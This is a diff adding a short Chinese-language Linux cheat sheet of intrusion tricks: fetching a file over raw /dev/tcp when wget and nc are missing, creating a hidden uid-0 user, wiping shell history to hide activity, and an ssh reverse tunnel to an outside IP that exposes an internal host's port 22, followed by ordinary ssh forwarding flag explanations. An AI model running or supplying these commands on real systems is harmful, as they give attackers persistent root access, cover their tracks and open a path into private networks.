@@ -1,0 +1,44 @@
+1、在没有wget 和 nc 等下载工具时下载文件
+
+	exec 5<>/dev/tcp/域名/端口 &&echo -e "GET /文件名 HTTP/1.0\n" >&5 && cat<&5 > 下载到的文件
+
+2、添加uid为0的用户	useradd -o -u 0 myh0st
+
+3、hash去掉history记录
+	
+	export HISTSIZE=0
+	export HISTFILE=/dev/null
+
+4、ssh反向代理
+
+	ssh -f -N -R 9999:localhost:22 bin@119.37.192.222
+
+	将内网22端口映射到外网 9999端口
+	然后外网ssh  127.0.0.1 9999 端口 可以连接到内网！
+
+
+	三种模式:
+		1.本地转发
+	ssh [-C] -f -N -g -L listen_port:DST_Host:DST_port user@Remote_Host
+		2.远程转发
+	ssh [-C] -f -N -g -R listen_port:DST_Host:DST_port user@Remote_Host
+		3.动态转发
+	ssh [-C] -f -N -g -D listen_port user@Remote_Host
+
+	参数：
+	-L  本地转发
+
+	-R  远程转发
+
+	-C  压缩传输数据
+
+	-D  动态转发
+
+	-p 被登录的ssd服务器的sshd服务端口
+
+	-N  运行命令后不登陆到远程server
+
+	-g  允许远程主机连接到本地端口
+
+	-f  后台运行
+
